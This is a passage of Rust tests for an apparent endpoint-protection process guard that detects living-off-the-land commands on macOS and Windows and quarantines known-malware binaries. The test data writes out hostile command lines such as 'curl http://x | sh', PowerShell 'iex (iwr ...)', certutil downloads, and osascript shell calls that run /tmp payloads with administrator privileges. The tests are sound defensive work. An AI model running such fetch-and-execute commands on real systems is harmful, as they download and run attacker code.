            assert_eq!(outcome(name, line), Outcome::Terminate, "{name}: {line}");
        }
        for (name, line, expected) in BENIGN {
            assert_eq!(outcome(name, line), *expected, "{name}: {line}");
        }
        // Alert-only is the weakest result: a stronger pattern in the same line still stops it,
        // and the name of a pattern that only alerts is never returned for a stop.
        assert!(is_alert_only(OSASCRIPT_SHELL_MENTION));
        assert!(!is_alert_only(OSASCRIPT_SHELL_FETCH));
        assert_eq!(
            match_lotl_macos(
                "sh",
                "sh -c 'launchctl load x.plist # osascript do shell script /tmp/'"
            ),
            Some("launchctl load")
        );
        // Words that change nothing for osascript itself (the old rule had none of them).
        for line in [
            "osascript -e 'do shell script \"xattr -c /tmp/p\"'",
            "osascript -e 'do shell script \"ch''mod u+x /tmp/p\"'",
            "osascript -e 'do shell script \"sh /tmp/p\" with administrator privileges'",
        ] {
            assert_eq!(outcome("osascript", line), Outcome::Terminate, "{line}");
        }
    }

    #[test]
    fn for_a_process_named_osascript_exactly_the_lines_85e35b4_stopped_are_stopped() {
        let mut lines: Vec<String> = MALICIOUS
            .iter()
            .map(|(_, l)| l.to_string())
            .chain(BENIGN.iter().map(|(_, l, _)| l.to_string()))
            .collect();
        let calls = [
            "do shell script \"X\"",
            "app.doShellScript(\"X\")",
            "do shell script \"id\" & \"X\" with administrator privileges",
            "display dialog \"X\"",
        ];
        let words = [
            "id",
            "curl http://x -o p",
            "wget http://x",
            "echo aQ== | base64 -D",
            "base64",
            "chmod +x p",
            "chmod 755 /tmp/p",
            "/tmp/p",
            "/private/tmp/p",
            "sh /tmp/p",
            "python3 /tmp/p.py",
            "xattr -c p",
            "openssl enc -d -in p",
            "launchctl load /tmp/x.plist",
            "launchctl load x",
            "curl http://x | sh",
            "with hidden answer",
            "b64decode(x)",
            "curl$IFS http://x",
        ];
        for prefix in [
            "osascript -e '",
            "osascript -l JavaScript -e '",
            "osascript - '",
        ] {
            for call in calls {
                for word in words {
                    lines.push(format!("{prefix}{}'", call.replace('X', word)));
                    lines.push(format!("{prefix}{}' -e '{word}'", call.replace('X', "id")));
                }
            }
        }
        let mut stopped = 0;
        for line in &lines {
            let old = reference_match_85e35b4("osascript", line);
            assert_eq!(match_lotl_macos("osascript", line), old, "{line}");
            assert_eq!(match_lotl_macos("OsaScript", line), old, "{line}");
            stopped += usize::from(old.is_some());
        }
        assert!(
            stopped > 50 && stopped < lines.len(),
            "{stopped} of {}",
            lines.len()
        );
        // Every other process behaves as before except for the one case this rule changes:
        // the shell call with a fetch word is an alert unless the line feeds osascript.
        for line in &lines {
            for name in ["zsh", "bash", "sh", "python3", "curl"] {
                let (old, new) = (
                    reference_match_85e35b4(name, line),
                    match_lotl_macos(name, line),
                );
                if old != new && !new.is_some_and(|n| !is_alert_only(n)) {
                    // Not stopped any more: only the case this rule changes, and only when no
                    // other pattern in the line stops it.
                    assert_eq!(old, Some(OSASCRIPT_SHELL_FETCH), "{name}: {line}");
                    assert_eq!(new, Some(OSASCRIPT_SHELL_MENTION), "{name}: {line}");
                    assert!(!line.contains("| osascript") && !line.contains("osascript <<"));
                }
            }
        }
    }

    #[cfg(unix)]
    #[test]
    fn an_alert_only_command_line_still_reaches_the_known_malware_check() {
        let dir = std::env::temp_dir().join(format!("thenex-pg-alertonly-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let dir = fs::canonicalize(&dir).unwrap();
        // Runs as a shell that only mentions osascript's shell call: alert-only.
        let exe = dir.join("zsh");
        fs::copy(std::env::current_exe().unwrap(), &exe).unwrap();
        let mut cfg = AppConfig::for_base_dir(&dir.join("base"));
        cfg.ensure_dirs().unwrap();
        let digest = known_bad::hash_file(&exe, u64::MAX).unwrap();
        let list = dir.join("list.bin");
        known_bad::write_list(&list, &[digest], 1_795_000_000).unwrap();
        cfg.hash_list = Some(list);
        cfg.load_known_bad().unwrap();
        let cfg = Arc::new(cfg);
        let mut g = ProcessGuard::new(
            Arc::clone(&cfg),
            Arc::new(BinaryAiScanner::heuristic_only()),
            Arc::new(Telemetry::default()),
        );
        // The copy only runs `napper` (extra words are just more test-name filters).
        let mut child = std::process::Command::new(&exe)
            .args(["--ignored", "--exact", "process_guard::tests::napper"])
            .args(["osascript", "do", "shell", "script", "/tmp/helper"])
            .env("THENEX_TEST_NAP", "1")
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .unwrap();
        let pid = Pid::from_u32(child.id());
        g.sys
            .refresh_processes_specifics(ProcessesToUpdate::All, true, refresh_kind());
        let done = g.inspect_command(pid);
        assert!(!done, "an alert-only match must not end the checks");
        g.inspect_binary(pid, false);
        let actions: Vec<String> = quarantine::read_recent_events(&cfg.events_log, 1 << 20)
            .unwrap()
            .into_iter()
            .map(|e| format!("{}: {}", e.threat_type, e.action_taken))
            .collect();
        assert!(
            actions
                .iter()
                .any(|a| a.starts_with("LOTL_SCRIPT: ALERT_ONLY")),
            "{actions:?}"
        );
        assert!(
            actions
                .iter()
                .any(|a| a.starts_with("KNOWN_MALWARE: TERMINATED")),
            "{actions:?}"
        );
        assert!(child.wait().is_ok());
        let _ = fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn respond_lotl_only_terminates_for_patterns_that_are_not_alert_only() {
        use std::process::Command;
        let dir = std::env::temp_dir().join(format!("thenex-pg-lotl-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        let cfg = AppConfig::for_base_dir(&dir);
        cfg.ensure_dirs().unwrap();
        let mut g = ProcessGuard::new(
            Arc::new(cfg),
            Arc::new(BinaryAiScanner::heuristic_only()),
            Arc::new(Telemetry::default()),
        );
        let mut child = Command::new("/bin/sleep").arg("30").spawn().unwrap();
        let pid = Pid::from_u32(child.id());
        g.sys
            .refresh_processes_specifics(ProcessesToUpdate::All, true, refresh_kind());
        let actions = |g: &ProcessGuard| -> Vec<String> {
            quarantine::read_recent_events(&g.cfg.events_log, 1 << 20)
                .unwrap()
                .into_iter()
                .rev()
                .map(|e| e.action_taken)
                .collect()
        };
        g.respond_lotl(pid, "zsh", "zsh -c x", OSASCRIPT_SHELL_MENTION);
        let seen = actions(&g);
        assert!(seen[0].starts_with("ALERT_ONLY: "), "{seen:?}");
        assert!(
            child.try_wait().unwrap().is_none(),
            "alert-only never kills"
        );
        g.respond_lotl(pid, "osascript", "osascript -e x", OSASCRIPT_SHELL_FETCH);
        assert_eq!(actions(&g)[1], "TERMINATED");
        assert!(child.wait().is_ok());
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn macos_ignores_benign_commands_and_other_processes() {
        assert_eq!(match_lotl_macos("zsh", "zsh -c ls -la | grep foo"), None);
        assert_eq!(
            match_lotl_macos(
                "curl",
                "curl -fsSL -o setup.pkg https://example.com/setup.pkg"
            ),
            None
        );
        assert_eq!(
            match_lotl_macos(
                "bash",
                "bash -c curl -s https://x/sums.txt | shasum -a 256 -c"
            ),
            None
        );
        assert_eq!(
            match_lotl_macos(
                "osascript",
                "osascript - The Nex: ZIP_BOMB (HIGH) /tmp/a.zip"
            ),
            None
        );
        assert_eq!(match_lotl_macos("Safari", "Safari -e x"), None);
        assert_eq!(
            match_lotl_macos("powershell.exe", "powershell -enc x"),
            None
        );
        assert_eq!(match_lotl("zsh", "zsh -c curl x | sh"), None);
    }

    #[test]
    fn unified_matcher_covers_both_platforms() {
        for (name, cmdline) in [
            ("powershell.exe", "powershell.exe -w hidden -enc SQBFAFgA"),
            ("powershell.exe", "powershell -ep bypass iex (iwr http://x)"),
            (
                "certutil.exe",
                "certutil -urlcache -split -f http://x/a.exe",
            ),
            ("sh", "sh -c \"curl http://x | sh\""),
            (
                "osascript",
                "osascript -e 'do shell script \"curl http://x/a | sh\"'",
            ),
            ("bash", "bash -c echo aWQ= | base64 -D"),
        ] {
            assert!(
                check_lotl_command(name, cmdline).is_some(),
                "{name}: {cmdline}"
            );
        }
        for (name, cmdline) in [
            ("powershell.exe", "powershell.exe -Command Get-Date"),
            ("git.exe", "git status"),
            ("git", "git status"),
            ("cargo.exe", "cargo build"),
            ("zsh", "zsh -c cargo build"),
        ] {
            assert_eq!(check_lotl_command(name, cmdline), None, "{name}: {cmdline}");
        }
    }

    /// Not a test: keeps a copy of this test program alive for the test below.
    #[test]
    #[ignore]
    fn napper() {
        if std::env::var_os("THENEX_TEST_NAP").is_some() {
            thread::sleep(Duration::from_secs(60));
        }
    }

    /// A copy of this test program that only runs `napper` (no platform program is copied: a
    /// copied /bin/sleep is sometimes refused or not yet visible when the test looks for it).
    #[cfg(unix)]
    fn spawn_napper(exe: &Path) -> std::process::Child {
        std::process::Command::new(exe)
            .args(["--ignored", "--exact", "process_guard::tests::napper"])
            .env("THENEX_TEST_NAP", "1")
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .unwrap()
    }

    /// Refreshes until each pid shows its image path: a process just started may not yet.
    #[cfg(unix)]
    fn refresh_until_seen(g: &mut ProcessGuard, pids: &[Pid]) {
        for _ in 0..200 {
            g.sys
                .refresh_processes_specifics(ProcessesToUpdate::All, true, refresh_kind());
            if pids
                .iter()
                .all(|pid| g.sys.process(*pid).is_some_and(|p| p.exe().is_some()))
            {
                return;
            }
            thread::sleep(Duration::from_millis(50));
        }
        panic!("started processes never showed their image path");
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn a_listed_program_is_stopped_unless_already_running_or_signed_by_apple() {
        use std::process::{Child, Command, Stdio};
        let dir = std::env::temp_dir().join(format!("thenex-pg-known-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let dir = fs::canonicalize(&dir).unwrap();
        // A copy of this test program (not signed by Apple) and the real /bin/sleep (signed by
        // Apple, and left where it is: the guard must not touch it); both go on the list.
        let (exe, apple) = (dir.join("napper"), PathBuf::from("/bin/sleep"));
        fs::copy(std::env::current_exe().unwrap(), &exe).unwrap();
        let nap = |program: &Path| -> Child {
            if program == apple {
                Command::new(program)
                    .arg("60")
                    .stdout(Stdio::null())
                    .stderr(Stdio::null())
                    .spawn()
                    .unwrap()
            } else {
                spawn_napper(program)
            }
        };

        let mut cfg = AppConfig::for_base_dir(&dir.join("base"));
        cfg.ensure_dirs().unwrap();
        let digests: Vec<Digest32> = [&exe, &apple]
            .iter()
            .map(|p| known_bad::hash_file(p, u64::MAX).unwrap())
            .collect();
        let list = dir.join("list.bin");
        known_bad::write_list(&list, &digests, 1_795_000_000).unwrap();
        cfg.hash_list = Some(list);
        cfg.load_known_bad().unwrap();
        let cfg = Arc::new(cfg);
        let events = |cfg: &AppConfig| -> Vec<ThreatEvent> {
            quarantine::read_recent_events(&cfg.events_log, 1 << 20)
                .unwrap()
                .into_iter()
                .rev() // oldest first
                .filter(|e| e.threat_type == "KNOWN_MALWARE")
                .collect()
        };
        let set_dry_run = |cfg: &AppConfig, on: bool| {
            let mut toggles = cfg.toggles.snapshot();
            toggles.set(Engine::DryRun, on);
            cfg.toggles.apply(toggles);
        };

        let mut old = nap(&exe);
        let mut g = ProcessGuard::new(
            Arc::clone(&cfg),
            Arc::new(BinaryAiScanner::heuristic_only()),
            Arc::new(Telemetry::default()),
        );
        let old_pid = Pid::from_u32(old.id());
        refresh_until_seen(&mut g, &[old_pid]);
        g.baseline
            .insert((old_pid, g.sys.process(old_pid).unwrap().start_time()));

        // Already running when protection started: reported, never stopped.
        g.inspect_binary(old_pid, true);
        let seen = events(&cfg);
        assert_eq!(seen.len(), 1);
        assert_eq!(seen[0].severity, Severity::Critical);
        assert!(seen[0].details.starts_with("matched known-malware list"));
        assert_eq!(
            seen[0].action_taken,
            "ALERT_ONLY: already running when protection started"
        );

        // A new copy of it: dry run only reports...
        let mut new = nap(&exe);
        let new_pid = Pid::from_u32(new.id());
        refresh_until_seen(&mut g, &[new_pid]);
        set_dry_run(&cfg, true);
        g.inspect_binary(new_pid, false);
        assert_eq!(
            events(&cfg)[1].action_taken,
            "DRY_RUN: would terminate process and quarantine executable"
        );
        assert!(new.try_wait().unwrap().is_none() && exe.exists());

        // ...and for real it is stopped and its file quarantined; the old one keeps running.
        set_dry_run(&cfg, false);
        g.inspect_binary(new_pid, false);
        let action = &events(&cfg)[2].action_taken;
        assert!(
            action.starts_with("TERMINATED 1 process(es); QUARANTINED id="),
            "{action}"
        );
        assert!(new.wait().is_ok() && !exe.exists());
        assert!(old.try_wait().unwrap().is_none(), "preexisting survives");

        // Signed by Apple: a wrong list entry must not take a system program away.
        let mut signed = nap(&apple);
        let signed_pid = Pid::from_u32(signed.id());
        refresh_until_seen(&mut g, &[signed_pid]);
        g.inspect_binary(signed_pid, false);
        assert_eq!(
            events(&cfg)[3].action_taken,
            "ALERT_ONLY: signed by the operating system vendor; alert only"
        );
        assert!(signed.try_wait().unwrap().is_none() && apple.exists());

        for child in [&mut old, &mut signed] {
            let _ = child.kill();
            let _ = child.wait();
        }
        let _ = fs::remove_dir_all(&dir);
    }

    /// A guard whose known-malware list holds exactly `listed`.
    #[cfg(target_os = "macos")]
    fn guard_with_list(dir: &Path, listed: &[&Path], scanner: BinaryAiScanner) -> ProcessGuard {
        let mut cfg = AppConfig::for_base_dir(&dir.join("base"));
        cfg.ensure_dirs().unwrap();
        let digests: Vec<Digest32> = listed
            .iter()
            .map(|p| known_bad::hash_file(p, u64::MAX).unwrap())
            .collect();
        let list = dir.join("list.bin");
        known_bad::write_list(&list, &digests, 1_795_000_000).unwrap();
        cfg.hash_list = Some(list);
        cfg.load_known_bad().unwrap();
        ProcessGuard::new(
            Arc::new(cfg),
            Arc::new(scanner),
            Arc::new(Telemetry::default()),
        )
    }

    #[cfg(target_os = "macos")]
    fn actions(g: &ProcessGuard) -> Vec<String> {
        quarantine::read_recent_events(&g.cfg.events_log, 1 << 20)
            .unwrap_or_default()
            .into_iter()
            .rev() // oldest first
            .map(|e| format!("{}: {}", e.threat_type, e.action_taken))
            .collect()
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn a_program_started_through_a_link_is_judged_as_the_file_it_is() {
        use std::os::unix::fs::symlink;
        let dir = std::env::temp_dir().join(format!("thenex-pg-link-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(dir.join("in")).unwrap();
        let dir = fs::canonicalize(&dir).unwrap();
        let (exe, other, link) = (dir.join("napper"), dir.join("other"), dir.join("link"));
        // `other` is another file: whatever is done about `exe` is not done about it.
        fs::copy(std::env::current_exe().unwrap(), &exe).unwrap();
        fs::copy(&exe, &other).unwrap();
        symlink(&exe, &link).unwrap();
        let dotted = dir.join("in").join("..").join("napper");
        for (round, started_by) in [&link, &dotted].into_iter().enumerate() {
            if !exe.exists() {
                fs::copy(&other, &exe).unwrap(); // quarantined by the round before
            }
            let base = dir.join(format!("round{round}"));
            fs::create_dir_all(&base).unwrap();
            let mut g = guard_with_list(&base, &[&exe], BinaryAiScanner::heuristic_only());
            let mut children = [spawn_napper(started_by), spawn_napper(&exe)];
            let mut bystander = spawn_napper(&other);
            let pids: Vec<Pid> = children.iter().map(|c| Pid::from_u32(c.id())).collect();
            refresh_until_seen(&mut g, &pids);
            refresh_until_seen(&mut g, &[Pid::from_u32(bystander.id())]);
            assert_eq!(
                g.sys.process(pids[0]).unwrap().exe(),
                Some(started_by.as_path()),
                "the system reports the path it was started by"
            );
            g.inspect_binary(pids[0], false);
            let seen = actions(&g);
            assert!(
                seen.len() == 1
                    && seen[0]
                        .starts_with("KNOWN_MALWARE: TERMINATED 2 process(es); QUARANTINED id="),
                "{}: {seen:?}",
                started_by.display()
            );
            assert!(children.iter_mut().all(|c| c.wait().is_ok()) && !exe.exists());
            assert!(bystander.try_wait().unwrap().is_none());
            let _ = bystander.kill();
            let _ = bystander.wait();
        }
        let _ = fs::remove_dir_all(&dir);
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn a_system_program_is_spared_whichever_way_it_is_spelled() {
        use std::os::unix::fs::symlink;
        let dir = std::env::temp_dir().join(format!("thenex-pg-oslink-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let dir = fs::canonicalize(&dir).unwrap();
        let sleep = Path::new("/bin/sleep");
        let link = dir.join("link");
        symlink(sleep, &link).unwrap();
        // On the list by mistake, and scored as certain malware by the AI.
        let mut g = guard_with_list(&dir, &[sleep], BinaryAiScanner::with_fixed_score(0.99));
        let mut child = std::process::Command::new(&link).arg("60").spawn().unwrap();
        let pid = Pid::from_u32(child.id());
        refresh_until_seen(&mut g, &[pid]);
        g.inspect_binary(pid, false);
        assert_eq!(
            actions(&g),
            ["KNOWN_MALWARE: ALERT_ONLY: signed by the operating system vendor; alert only"]
        );
        // Without the list the AI does not judge it either: the system's own is trusted.
        let empty = dir.join("ai");
        fs::create_dir_all(&empty).unwrap();
        let mut g = guard_with_list(&empty, &[], BinaryAiScanner::with_fixed_score(0.99));
        refresh_until_seen(&mut g, &[pid]);
        g.inspect_binary(pid, false);
        assert!(actions(&g).is_empty(), "{:?}", actions(&g));
        assert!(child.try_wait().unwrap().is_none() && sleep.exists());
        let _ = child.kill();
        let _ = child.wait();

        // The path as it is written can be the protected one, too: the data folder here.
        let data = dir.join("base");
        let inside = data.join("tool");
        fs::write(dir.join("elsewhere"), b"x").unwrap();
        symlink(dir.join("elsewhere"), &inside).unwrap();
        assert_eq!(real_path(&inside, &data), inside);
        assert_eq!(real_path(&link, &data), sleep);
        // ".." never makes it protected, and what cannot be resolved stays as it is.
        assert_eq!(
            real_path(&data.join("..").join("elsewhere"), &data),
            dir.join("elsewhere")
        );
        for odd in ["/nonexistent/x", "bin/sleep", "./x"] {
            assert_eq!(real_path(Path::new(odd), &data), Path::new(odd));
        }
        let _ = fs::remove_dir_all(&dir);
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn a_running_program_that_is_always_allowed_is_not_flagged() {
        use std::process::{Command, Stdio};
        let dir = std::env::temp_dir().join(format!("thenex-pg-allow-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let dir = fs::canonicalize(&dir).unwrap();
        // A copy of this test program: not signed by Apple, so the AI judges it.
        let exe = dir.join("napper");
        fs::copy(std::env::current_exe().unwrap(), &exe).unwrap();
        let cfg = AppConfig::for_base_dir(&dir.join("base"));
        cfg.ensure_dirs().unwrap();
        let mut toggles = cfg.toggles.snapshot();
        toggles.set(Engine::DryRun, true);
        cfg.toggles.apply(toggles);
        let cfg = Arc::new(cfg);
        let mut child = Command::new(&exe)
            .args(["--ignored", "--exact", "process_guard::tests::napper"])
            .env("THENEX_TEST_NAP", "1")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .unwrap();
        let pid = Pid::from_u32(child.id());
        let mut g = ProcessGuard::new(
            Arc::clone(&cfg),
            Arc::new(BinaryAiScanner::with_fixed_score(0.99)),
            Arc::new(Telemetry::default()),
        );
        g.sys
            .refresh_processes_specifics(ProcessesToUpdate::All, true, refresh_kind());
        let events = || -> Vec<ThreatEvent> {
            quarantine::read_recent_events(&cfg.events_log, 1 << 20)
                .unwrap_or_default()
                .into_iter()
                .filter(|e| e.threat_type == "MALWARE_AI_PROCESS")
                .collect()
        };

        g.inspect_binary(pid, false);
        let seen = events();
        assert_eq!(seen.len(), 1);
        let sha = quarantine::sha256_file(&exe).unwrap();
        assert_eq!(seen[0].sha256.as_deref(), Some(sha.as_str()));

        let entry = allowlist::AllowedFile::new(&sha, "napper", "MALWARE_AI_PROCESS").unwrap();
        allowlist::add(&cfg, entry).unwrap();
        g.inspect_binary(pid, false);
        assert_eq!(events().len(), 1, "an allowed program raises nothing");
        assert!(child.try_wait().unwrap().is_none());
        let _ = child.kill();
        let _ = child.wait();
        let _ = fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn kill_all_with_exe_spares_preexisting_instances() {
        let dir = std::env::temp_dir().join(format!("thenex-pg-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let exe = dir.join("napper");
        fs::copy(std::env::current_exe().unwrap(), &exe).unwrap();
        let mut old = spawn_napper(&exe);
        let mut new = spawn_napper(&exe);
        let cfg = Arc::new(AppConfig::for_base_dir(&dir.join("base")));
        let mut g = ProcessGuard::new(
            cfg,
            Arc::new(BinaryAiScanner::heuristic_only()),
            Arc::new(Telemetry::default()),
        );
        let old_pid = Pid::from_u32(old.id());
        refresh_until_seen(&mut g, &[old_pid, Pid::from_u32(new.id())]);
        let started = g.sys.process(old_pid).unwrap().start_time();
        g.baseline.insert((old_pid, started));
        let canon = fs::canonicalize(&exe).unwrap();
        let killed = g.kill_all_with_exe(&canon);
        assert_eq!(killed, vec![Pid::from_u32(new.id())]);
        assert!(new.wait().is_ok());
        assert!(
            old.try_wait().unwrap().is_none(),
            "preexisting must survive"
        );
        let _ = old.kill();
        let _ = old.wait();
        let _ = fs::remove_dir_all(&dir);
    }
}
